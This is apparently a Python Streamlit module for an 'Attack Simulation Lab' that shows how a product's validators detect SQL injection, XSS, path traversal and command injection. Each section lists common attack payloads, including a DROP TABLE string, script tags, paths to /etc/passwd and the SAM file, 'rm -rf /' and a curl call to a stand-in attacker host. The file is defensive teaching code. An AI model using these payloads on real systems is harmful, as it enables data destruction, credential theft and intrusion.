import streamlit as st
from utils.validators import (
    detect_sql_injection,
    detect_xss,
    detect_path_traversal,
    sanitize_string
)
from services.api_client import get_api_client
import logging

logger = logging.getLogger(__name__)


def attack_demo_widget():
    """
    Display interactive attack demonstration widget
    
    Shows how AgentFlow's security layer blocks common attacks:
    - SQL Injection
    - XSS (Cross-Site Scripting)
    - Path Traversal
    - Command Injection
    """
    
    st.markdown("### 🎭 Attack Simulation Lab")
    
    st.markdown("""
    <div style='background: rgba(255, 171, 0, 0.1); border-left: 4px solid #ffab00; padding: 1rem; border-radius: 8px; margin-bottom: 1rem;'>
        ⚠️ <strong>Educational Purpose Only</strong><br/>
        This demonstration shows how our security layer blocks attacks.
        All tests are safely contained and logged.
    </div>
    """, unsafe_allow_html=True)
    
    # Attack type selector
    attack_type = st.selectbox(
        "Select Attack Type",
        options=[
            "SQL Injection",
            "XSS (Cross-Site Scripting)",
            "Path Traversal",
            "Command Injection"
        ],
        help="Choose the type of attack to simulate"
    )
    
    st.divider()
    
    # SQL Injection Demo
    if attack_type == "SQL Injection":
        _demo_sql_injection()
    
    # XSS Demo
    elif attack_type == "XSS (Cross-Site Scripting)":
        _demo_xss()
    
    # Path Traversal Demo
    elif attack_type == "Path Traversal":
        _demo_path_traversal()
    
    # Command Injection Demo
    elif attack_type == "Command Injection":
        _demo_command_injection()


def _demo_sql_injection():
    """SQL Injection demonstration"""
    
    st.markdown("#### 🗃️ SQL Injection Attack")
    
    st.markdown("""
    **What is SQL Injection?**
    
    SQL Injection is an attack where malicious SQL code is inserted into input fields
    to manipulate database queries. This can lead to:
    - Unauthorized data access
    - Data modification or deletion
    - Authentication bypass
    """)
    
    # Common payloads
    common_payloads = [
        "' OR '1'='1",
        "admin'--",
        "1'; DROP TABLE users--",
        "' UNION SELECT * FROM passwords--",
        "admin' OR 1=1#"
    ]
    
    col1, col2 = st.columns([2, 1])
    
    with col1:
        payload = st.text_area(
            "Enter SQL payload to test:",
            value=common_payloads[0],
            height=100,
            help="Try different SQL injection patterns"
        )
    
    with col2:
        st.markdown("**Common Payloads:**")
        for i, p in enumerate(common_payloads):
            if st.button(f"`{p}`", key=f"sql_{i}", use_container_width=True):
                st.session_state.attack_payload = p
                st.rerun()
    
    if st.button("🧪 Test SQL Injection", type="primary", use_container_width=True):
        is_attack, patterns = detect_sql_injection(payload)
        
        if is_attack:
            st.error(f"""
            🚫 **ATTACK BLOCKED!**
            
            **Detection:** SQL Injection patterns found
            **Patterns:** {', '.join(patterns)}
            **Action:** Request rejected
            """)
            
            st.code(f"Original payload:\n{payload}", language="sql")
            
            # Log to backend
            try:
                client = get_api_client()
                result = client.test_attack('sql_injection', payload)
                if result.get('success'):
                    st.success("✅ Attack logged to security system")
            except Exception as e:
                logger.error(f"Failed to log attack: {e}")
        else:
            st.success("""
            ✅ **INPUT SAFE**
            
            No SQL injection patterns detected.
            Query would be processed normally.
            """)


def _demo_xss():
    """XSS demonstration"""
    
    st.markdown("#### 💉 Cross-Site Scripting (XSS) Attack")
    
    st.markdown("""
    **What is XSS?**
    
    XSS attacks inject malicious JavaScript into web pages viewed by other users.
    This can lead to:
    - Session hijacking
    - Data theft
    - Defacement
    - Phishing
    """)
    
    # Common payloads
    common_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'>",
        "<body onload=alert('XSS')>"
    ]
    
    col1, col2 = st.columns([2, 1])
    
    with col1:
        payload = st.text_area(
            "Enter XSS payload to test:",
            value=common_payloads[0],
            height=100
        )
    
    with col2:
        st.markdown("**Common Payloads:**")
        for i, p in enumerate(common_payloads):
            if st.button(f"`{p[:20]}...`", key=f"xss_{i}", use_container_width=True):
                st.session_state.attack_payload = p
                st.rerun()
    
    if st.button("🧪 Test XSS", type="primary", use_container_width=True):
        is_attack, patterns = detect_xss(payload)
        
        if is_attack:
            st.error(f"""
            🚫 **ATTACK BLOCKED!**
            
            **Detection:** XSS patterns found
            **Patterns:** {', '.join(patterns)}
            **Action:** Input sanitized
            """)
            
            st.code(f"Malicious payload:\n{payload}", language="html")
            
            # Show sanitized version
            sanitized = sanitize_string(payload)
            st.markdown("**Sanitized Output:**")
            st.code(sanitized, language="html")
            
            st.info("HTML entities encoded to prevent script execution")
        else:
            st.success("✅ INPUT SAFE - No XSS patterns detected")


def _demo_path_traversal():
    """Path Traversal demonstration"""
    
    st.markdown("#### 📁 Path Traversal Attack")
    
    st.markdown("""
    **What is Path Traversal?**
    
    Path Traversal attacks use special character sequences to access files
    outside the intended directory. This can expose:
    - System files
    - Configuration files
    - Source code
    - Sensitive data
    """)
    
    # Common payloads
    common_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "../../../../../../var/log/apache2/access.log"
    ]
    
    col1, col2 = st.columns([2, 1])
    
    with col1:
        payload = st.text_input(
            "Enter file path to test:",
            value=common_payloads[0]
        )
    
    with col2:
        st.markdown("**Common Payloads:**")
        for i, p in enumerate(common_payloads[:3]):
            if st.button(f"`{p[:25]}...`", key=f"path_{i}", use_container_width=True):
                st.session_state.attack_payload = p
                st.rerun()
    
    if st.button("🧪 Test Path Traversal", type="primary", use_container_width=True):
        is_attack, patterns = detect_path_traversal(payload)
        
        if is_attack:
            st.error(f"""
            🚫 **ATTACK BLOCKED!**
            
            **Detection:** Path traversal patterns found
            **Patterns:** {', '.join(patterns)}
            **Action:** File access denied
            """)
            
            st.code(f"Malicious path:\n{payload}")
            
            st.warning("""
            **Blocked Sequences:**
            - `../` or `..\\` (directory traversal)
            - Encoded sequences (`%2e%2e/`)
            - Null bytes (`%00`)
            """)
        else:
            st.success("✅ PATH SAFE - No traversal patterns detected")


def _demo_command_injection():
    """Command Injection demonstration"""
    
    st.markdown("#### 💻 Command Injection Attack")
    
    st.markdown("""
    **What is Command Injection?**
    
    Command Injection allows attackers to execute arbitrary system commands
    on the server. This can lead to:
    - Complete system compromise
    - Data exfiltration
    - Service disruption
    - Backdoor installation
    """)
    
    # Common payloads
    common_payloads = [
        "; ls -la",
        "| cat /etc/passwd",
        "&& whoami",
        "`rm -rf /`",
        "$(curl attacker.com)"
    ]
    
    col1, col2 = st.columns([2, 1])
    
    with col1:
        payload = st.text_input(
            "Enter command to test:",
            value=common_payloads[0]
        )
    
    with col2:
        st.markdown("**Common Payloads:**")
        for i, p in enumerate(common_payloads):
            if st.button(f"`{p}`", key=f"cmd_{i}", use_container_width=True):
                st.session_state.attack_payload = p
                st.rerun()
    
    if st.button("🧪 Test Command Injection", type="primary", use_container_width=True):
        # Simple command injection detection
        dangerous_chars = [';', '|', '&', '`', '$', '(', ')', '<', '>']
        is_attack = any(char in payload for char in dangerous_chars)
        
        if is_attack:
            found_chars = [char for char in dangerous_chars if char in payload]
            
            st.error(f"""
            🚫 **ATTACK BLOCKED!**
            
            **Detection:** Command injection characters found
            **Characters:** {', '.join(f'`{c}`' for c in found_chars)}
            **Action:** Command execution prevented
            """)
            
            st.code(f"Malicious command:\n{payload}", language="bash")
            
            st.warning("""
            **Blocked Characters:**
            - `;` (command separator)
            - `|` (pipe)
            - `&` (background/chain)
            - `` ` `` (command substitution)
            - `$()` (command substitution)
            """)
        else:
            st.success("✅ COMMAND SAFE - No injection patterns detected")


# Example usage in page
def show_attack_demo_page():
    """Show attack demo page with widget"""
    st.title("🛡️ Security Attack Demonstration")
    attack_demo_widget()